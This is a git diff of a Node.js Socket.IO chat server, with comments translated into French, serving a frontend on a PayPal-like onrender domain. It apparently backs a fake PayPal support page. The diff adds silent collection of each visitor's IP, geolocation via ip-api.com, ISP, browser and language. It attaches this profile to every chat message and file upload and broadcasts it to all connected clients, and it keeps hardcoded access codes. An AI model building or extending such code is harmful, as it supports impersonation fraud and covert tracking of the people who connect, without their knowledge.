@@ -4,34 +4,34 @@ const http = require('http');
 const { Server } = require("socket.io");
 const cors = require('cors');
 
-// --- Server Initialization ---
+// --- Initialisation du serveur ---
 const app = express();
 const server = http.createServer(app);
 
-// --- CORS Configuration ---
-const frontendURL = "https://paypal-owpo.onrender.com"; // Your live frontend URL
+// --- Configuration CORS ---
+const frontendURL = "https://paypal-owpo.onrender.com"; // Assurez-vous que c'est la bonne URL de votre frontend
 app.use(cors({ origin: frontendURL }));
 
-// --- Socket.IO Initialization ---
+// --- Initialisation de Socket.IO ---
 const io = new Server(server, {
   cors: {
     origin: frontendURL,
     methods: ["GET", "POST"]
-  }
+  },
+  maxHttpBufferSize: 1e6 // Limite de 1Mo pour les données (fichiers)
 });
 
 app.use(express.json());
 
-// --- Hardcoded Credentials ---
+// --- Identifiants ---
 const CORRECT_CODE_USER = "H25lnFfA3mNbU4nF5WDZ";
 const CORRECT_DATE_USER = "18/09/2025";
 const CORRECT_CODE_SERVICE = "gg";
 const CORRECT_DATE_SERVICE = "123";
 
-// --- API Route for Verification ---
+// --- Route API de vérification ---
 app.post('/verify', (req, res) => {
   const { code, date } = req.body;
-
   if (code === CORRECT_CODE_USER && date === CORRECT_DATE_USER) {
     res.status(200).json({ success: true, userType: 'User' });
   } else if (code === CORRECT_CODE_SERVICE && date === CORRECT_DATE_SERVICE) {
@@ -41,32 +41,55 @@ app.post('/verify', (req, res) => {
   }
 });
 
-// --- Socket.IO Connection Handling ---
-io.on('connection', (socket) => {
-  console.log('A user connected to the chat!');
+// --- Gestion des connexions Socket.IO ---
+io.on('connection', async (socket) => { // La fonction est asynchrone pour permettre la géolocalisation
+  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
+  let geoInfo = { city: 'N/A', country: 'N/A', isp: 'N/A' };
 
-  // Notify support when a user connects
+  try {
+      // On interroge un service de géolocalisation gratuit
+      const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
+      const geoData = await geoResponse.json();
+      if (geoData.status === 'success') {
+        geoInfo = {
+          city: geoData.city,
+          country: geoData.country,
+          isp: geoData.isp,
+        };
+      }
+  } catch (error) {
+    console.error("Erreur de géolocalisation:", error);
+  }
+
+  // On assemble toutes les informations dans un seul objet
+  const clientInfo = {
+    ip: clientIp,
+    userAgent: socket.handshake.headers['user-agent'] || 'N/A',
+    language: socket.handshake.headers['accept-language'] || 'N/A',
+    connectedAt: new Date().toISOString(),
+    ...geoInfo
+  };
+  
+  console.log(`Un utilisateur s'est connecté : `, clientInfo);
+
   socket.broadcast.emit('user activity', { text: 'A user has connected.' });
 
   socket.on('chat message', (msg) => {
-    io.emit('chat message', msg);
+    io.emit('chat message', { ...msg, clientInfo });
   });
 
-  socket.on('clear chat', () => {
-    io.emit('chat cleared');
-    console.log('Chat was cleared by an admin.');
+  socket.on('file message', (fileData) => {
+    io.emit('file message', { ...fileData, clientInfo });
   });
 
-  socket.on('disconnect', () => {
-    console.log('A user disconnected');
-    // Notify support when a user disconnects
-    io.emit('user activity', { text: 'A user has disconnected.' });
-  });
+  socket.on('clear chat', () => { io.emit('chat cleared'); });
+  socket.on('disconnect', () => { io.emit('user activity', { text: 'A user has disconnected.' }); });
 });
 
-// --- Server Start ---
+
+// --- Démarrage du serveur ---
 const PORT = process.env.PORT || 3001;
 server.listen(PORT, () => {
-  console.log(`Server is running and listening on port ${PORT}`);
+  console.log(`Le serveur est démarré et écoute sur le port ${PORT}`);
 });
 
